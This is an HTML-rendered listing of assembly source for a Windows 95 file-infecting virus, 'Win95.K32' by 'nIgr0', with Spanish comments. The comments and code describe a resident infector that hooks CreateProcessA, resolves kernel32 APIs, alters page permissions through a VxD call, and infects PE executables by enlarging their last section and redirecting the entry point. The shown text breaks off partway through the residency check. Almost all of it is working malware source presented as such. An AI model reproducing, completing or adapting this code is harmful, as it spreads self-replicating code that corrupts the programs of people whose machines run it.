<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win9x.K32.3030 - k32.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;***********************************************************************</span><span class="sc0">
</span><span class="sc1">;*                                                                     * </span><span class="sc0">
</span><span class="sc1">;*          VIRUS  WIN95.K32       By nIgr0                            * </span><span class="sc0">
</span><span class="sc1">;*                                                                     *</span><span class="sc0">
</span><span class="sc1">;***********************************************************************</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Virus residente, pa win95</span><span class="sc0">
</span><span class="sc1">;  Uso el espacio libre dejado por el header del kernel32</span><span class="sc0">
</span><span class="sc1">;    dentro de la primera p gina.</span><span class="sc0">
</span><span class="sc1">;  Parcheo el API CreateProcessA mediante un JMP</span><span class="sc0">
</span><span class="sc1">;  Modifico los permisos de las p ginas que voy a utilizar</span><span class="sc0">
</span><span class="sc1">;    mediante una llamada a CALLVXD0 (_PageModifyPermissions)</span><span class="sc0">
</span><span class="sc1">;    Vxd 01 servicio 0d.</span><span class="sc0">
</span><span class="sc1">;  Hallo la direccion de las apis a utilizar buscando en la</span><span class="sc0">
</span><span class="sc1">;    export table del kernel32 , supongo la direcci¢n base del</span><span class="sc0">
</span><span class="sc1">;    kernel32.dll como 0bff70000h . La unica comprobaci¢n que hago</span><span class="sc0">
</span><span class="sc1">;    al respecto es mirar en la pila [sp+3]=0b7h, con lo que </span><span class="sc0">
</span><span class="sc1">;    por lo menos si no es 0bff70000h se acerca :)</span><span class="sc0">
</span><span class="sc1">;  Infecto aumentando la ultima secci¢n del file y modifico el</span><span class="sc0">
</span><span class="sc1">;    entrypoint del file, pero no modifico los atributos de la £ltima</span><span class="sc0">
</span><span class="sc1">;    secci¢n aunque estos sean de solo lectura ,paso completamente de esos</span><span class="sc0">
</span><span class="sc1">;    atributos y luego mientras se ejecuta el virus este se pone los</span><span class="sc0">
</span><span class="sc1">;    atributos de pagina que quiera mediante el servicio</span><span class="sc0">
</span><span class="sc1">;     _PageModifyPermissions.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">



</span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">STDCALL</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">win32.inc</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">      </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">      </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">        </span><span class="sc1">;apis exportadas unicamente en la primera</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">      </span><span class="sc5">CreateProcessA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">     </span><span class="sc1">;generaci¢n</span><span class="sc0">


</span><span class="sc1">;*********** Aqu¡ algunas equs interesantes ****************</span><span class="sc0">

</span><span class="sc5">viriisize</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc4">(((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)+</span><span class="sc2">064h</span><span class="sc4">)/</span><span class="sc2">065h</span><span class="sc4">)*</span><span class="sc2">065h</span><span class="sc0">
</span><span class="sc5">K32</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc2">0bff70000h</span><span class="sc0">
</span><span class="sc5">hueco</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc2">0bffc0400h</span><span class="sc0">   </span><span class="sc1">;Zona en el header </span><span class="sc0">

</span><span class="sc5">GENERIC_READ</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">80000000H</span><span class="sc0">  </span><span class="sc1">;abre archivo para lectura</span><span class="sc0">
</span><span class="sc5">GENERIC_WRITE</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">40000000H</span><span class="sc0">  </span><span class="sc1">;abre el archivo para escritura</span><span class="sc0">
</span><span class="sc5">OPEN_EXISTING</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">          </span><span class="sc1">;usado por CreateFile para abrir archivo existente</span><span class="sc0">


</span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc5">dummy</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">                         </span><span class="sc1">;de esta secci¢n paso</span><span class="sc0">
</span><span class="sc5">mess</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">'nIgrO rUlez!!!$'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">text</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">'Virus Win95.K32 .... Ejecutado'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">



</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;este es el codigo de un Hoste Ficticio</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">mess</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">text</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc1">;       call MessageBoxA       </span><span class="sc0">



</span><span class="sc5">Lajodimos</span><span class="sc4">:</span><span class="sc0">

       </span><span class="sc6">Push</span><span class="sc0">  </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc1">;***************** Comienzo del Virus **********************</span><span class="sc0">

</span><span class="sc5">startvirii</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">0bfh</span><span class="sc0">    </span><span class="sc1">;verifico que se llama desde el</span><span class="sc0">
          </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">malasunto</span><span class="sc0">                </span><span class="sc1">;la direcci¢n bf??????h</span><span class="sc0">

          </span><span class="sc6">pushad</span><span class="sc0">                     </span><span class="sc1">;pusheo tooo</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">ebp</span><span class="sc0">

          </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">getdesp</span><span class="sc0">              </span><span class="sc1">;obtengo el delta</span><span class="sc0">
</span><span class="sc5">getdesp</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ebp</span><span class="sc0">                     
          </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">getdesp</span><span class="sc0">

          </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">saltito</span><span class="sc0">         </span><span class="sc1">;jmp pa esquivar la zona de datos :)</span><span class="sc0">

</span><span class="sc1">;***************** Comienzo de la zona de Datos ***********</span><span class="sc0">

</span><span class="sc5">startdata</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">PARCHE</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0bff70400h</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">starthook</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">startvirii</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">codigoparcheado</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">010h</span><span class="sc0">     </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">FIRMA</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'Virus K32 por nIgr0  ... "Hazlo o no lo hagas pero no lo intentes"'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">NLH</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'nIgr0_lives_here!!!!'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">IOBYTES</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
</span><span class="sc5">llamada</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">0bff713d4h</span><span class="sc0">         </span><span class="sc1">;direcci¢n de CallVXD0 hallada anteriormente</span><span class="sc0">
</span><span class="sc5">hoste</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc12">'c:\virus\k32\K.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'                                     '</span><span class="sc0">

</span><span class="sc5">ahand</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; handle del virus que abro</span><span class="sc0">
</span><span class="sc5">peheaderoffset</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; Guardo el  offset del  peheader del archivo</span><span class="sc0">
</span><span class="sc5">ObjectTableoffset</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; Guardo el  offset de la object table en memoria</span><span class="sc0">
</span><span class="sc5">bytesread</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">; numero de bytes que leo/escrito en el archivo</span><span class="sc0">

</span><span class="sc5">secdesplaza</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
</span><span class="sc5">secphy</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">startvirii</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span><span class="sc5">ultfisicalsize</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">

</span><span class="sc5">newobject</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; Zona en la que almaceno el ultimo objeto</span><span class="sc0">
</span><span class="sc5">oname</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">".nigro"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Pa modificarlo a placer</span><span class="sc0">
</span><span class="sc5">virtualsize</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RVA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">physicalsize</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">physicaloffset</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">reserved</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">objectflags</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">     

</span><span class="sc5">peheader</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; Estructura del Pe header </span><span class="sc0">
        </span><span class="sc5">signature</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">cputype</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">numObj</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">     </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">NtHeaderSize</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">Flags</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">      </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">entrypointRVA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">      </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">      
        </span><span class="sc5">objalign</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">filealign</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">     </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc5">imagesize</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">headersize</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">400h</span><span class="sc0">     </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">addresstable</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">;direccion de la addresstable en la export table</span><span class="sc0">
</span><span class="sc5">nametable</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">;direccion la tabla de punteros a strings (de la export table)</span><span class="sc0">
</span><span class="sc5">ordinaltable</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">;puntero a la ordinal table</span><span class="sc0">
</span><span class="sc5">contador</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">;pa calcular la posici¢n del puntero en la nametable que</span><span class="sc0">
                           </span><span class="sc1">;que apunte a la api buscada.</span><span class="sc0">
</span><span class="sc5">apiabuscar</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">;offset donde se encuentra la string de la api a</span><span class="sc0">
                           </span><span class="sc1">;buscar (es usada temporalmente por mi</span><span class="sc0">
                           </span><span class="sc1">;procedimiento GetAdressAPi)</span><span class="sc0">
</span><span class="sc5">longitudapi</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc1">;************** Direcciones para las APIS *******************</span><span class="sc0">


</span><span class="sc5">nombreapis</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">010d</span><span class="sc0">
                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'      '</span><span class="sc0">      </span><span class="sc1">;strings de las apis que</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">014d</span><span class="sc0">
                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetFilePointer'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'  '</span><span class="sc0">      </span><span class="sc1">;voy a utilizar</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">08d</span><span class="sc0">
                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ReadFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'        '</span><span class="sc0">      </span><span class="sc1">;junto con el tama¤o de la</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">09d</span><span class="sc0">
                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WriteFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'       '</span><span class="sc0">      </span><span class="sc1">;string</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">011d</span><span class="sc0">
                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'     '</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">014d</span><span class="sc0">
                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateProcessA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'  '</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">016d</span><span class="sc0">
                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetModuleHandleA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">014d</span><span class="sc0">
                  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetProcAddress'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'  '</span><span class="sc0">
</span><span class="sc5">direccionesapis</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">newCreateFile</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">;0bff7799ch      ;valores para mi versi¢n de WIN :)</span><span class="sc0">
</span><span class="sc5">newSetFilePointer</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">;0bff770e4h</span><span class="sc0">
</span><span class="sc5">newReadFile</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">;0bff7594ah</span><span class="sc0">
</span><span class="sc5">newWriteFile</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">;0bff75951h</span><span class="sc0">
</span><span class="sc5">newCloseFile</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">;0bff7bc8bh</span><span class="sc0">
</span><span class="sc5">newCreateProcessA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">;0bff775e8h</span><span class="sc0">
</span><span class="sc5">newGetModuleHandleA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">newGetProcAddress</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">dllmensajito</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'USER32.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">apimensajito</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MessageBoxA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;***************** Fin de la Zona de datos ***********************</span><span class="sc0">


</span><span class="sc5">saltito</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc1">;en eax viene el entrypoint del virii</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;copia de seguridad</span><span class="sc0">

       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;empiezo a calcular la direccion de CALLVXD0</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">K32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3CH</span><span class="sc0">
       </span><span class="sc6">lodsw</span><span class="sc0">                      </span><span class="sc1">;en ax me quedar  el comienzo del PE header</span><span class="sc0">

       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">K32</span><span class="sc0">            </span><span class="sc1">;a la que le suma la direcci¢n base del Kernel32</span><span class="sc0">


       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc2">00004550H</span><span class="sc0">       </span><span class="sc1">;verifico que es un PE header</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">NoERROR</span><span class="sc0">

</span><span class="sc10">ERROR</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">melaspiro</span><span class="sc0">


</span><span class="sc5">NoERROR</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">78H</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; 78H = la direcci¢n a la export table</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">K32</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1CH</span><span class="sc0">           </span><span class="sc1">; 1CH RVA para la adress table</span><span class="sc0">

    
       </span><span class="sc6">lodsd</span><span class="sc0">                           </span><span class="sc1">; en eax queda la RVA al primer ordinal</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">K32</span><span class="sc0">                 </span><span class="sc1">; es decir la direcci¢n a la CALLVXD0</span><span class="sc0">

       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">;en esi=eax</span><span class="sc0">

       </span><span class="sc6">lodsd</span><span class="sc0">                           </span><span class="sc1">;obtengo la RVA de la primera API</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">K32</span><span class="sc0">                 </span><span class="sc1">;EAX = La direcci¢n de la primera API</span><span class="sc0">


       </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">0fffff000h</span><span class="sc0">       </span><span class="sc1">;calculo la pagina del virii</span><span class="sc0">
       </span><span class="sc6">ror</span><span class="sc0">   </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">012d</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">modificarpermisos</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
       
       </span><span class="sc6">and</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">00000fffh</span><span class="sc0">          </span><span class="sc1">;verifico que no va a utilizar 2 paginas</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">viriisize</span><span class="sc0">          </span><span class="sc1">;en caso de que utilice 2 paginas , marco</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">01000h</span><span class="sc0">             </span><span class="sc1">;la segunda pagina tambien para escritura</span><span class="sc0">
       </span><span class="sc6">jl</span><span class="sc0">    </span><span class="sc5">continuar</span><span class="sc0">

       </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">modificarpermisos</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">continuar</span><span class="sc4">:</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">llamada</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;salvo la direcci¢n de CALLVXD0</span><span class="sc0">

       </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0bff70400h</span><span class="sc0">                 </span><span class="sc1">;verifico que no est  residente </span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
